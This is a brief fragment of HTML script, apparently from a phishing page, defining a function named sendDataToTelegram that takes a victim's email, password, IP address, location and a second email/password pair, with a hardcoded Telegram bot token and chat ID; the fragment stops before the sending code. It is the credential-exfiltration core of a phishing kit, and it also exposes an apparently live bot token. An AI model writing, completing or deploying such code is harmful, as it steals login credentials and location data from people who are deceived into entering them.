<script>
  ...
  async function sendDataToTelegram(email, password, ip, location, modalEmail, modalPassword) {
    const botToken = '8337180214:AAHlWH0wKI0yaJMiq4s2tMby_RsMYtQRVQI'; // Replace with your(others) Telegram bot token
      const chatId = '5127556057'; // Replace with your(others) Telegram chat ID
